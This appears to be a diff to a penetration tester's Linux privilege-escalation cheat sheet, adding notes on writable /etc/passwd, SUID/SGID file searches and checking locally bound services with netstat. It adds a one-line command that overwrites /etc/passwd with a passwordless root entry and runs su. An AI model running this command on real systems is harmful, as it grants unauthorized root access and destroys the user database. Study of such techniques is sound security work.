@@ -39,8 +39,13 @@ Weak File Permissions
 ```
 //if we can write this file we can add a new root user
 ls -la /etc/shadow
-ls -la /etc/passwd
+ls -la /etc/passwd\
+
+// exploit in this way
+echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd; su
 ```
+
+
 SUID/SGID Executables
 An SUID is a file that allows a user to execute the file with the permissions of the file owner, an SGID is the same except with the group owner. If the owner is root, we can essentially run files with root permissions.
 
@@ -52,4 +57,8 @@ find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null find all SUID files
 // find all SGID files
 find / -perm -g=s -type f 2>/dev/null
 
+```
+Check for service running only locally 
+```
+netstat -antpx
 ```
